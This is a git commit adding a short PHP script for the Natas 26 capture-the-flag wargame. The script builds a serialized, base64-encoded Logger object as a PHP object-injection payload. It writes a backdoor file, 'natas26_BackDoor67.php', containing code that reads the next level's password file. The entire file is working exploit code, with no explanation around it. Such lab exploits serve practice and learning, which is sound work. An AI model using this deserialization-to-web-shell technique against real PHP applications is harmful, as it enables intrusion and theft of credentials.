ba7239c8aa6ca719136bfa855e8de59adcebf2d1
Abdullah Taher Anwer Shaikh <abdullah.taher810@gmail.com>
2026-08-13 15:39:04 +0300

    Add Logger class for Natas 26 tool

---
+++ Natas/Scripts/Natas 26 tool.php
@@ -0,0 +1,14 @@
+<?php
+class Logger {
+    private $logFile;
+    private $initMsg;
+    private $exitMsg;
+    function __construct(){
+        $this->initMsg = "";
+        $this->exitMsg = "<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>";
+        $this->logFile = "img/natas26_BackDoor67.php";
+    }
+}
+$o = new Logger();
+echo base64_encode(serialize($o));
+?>
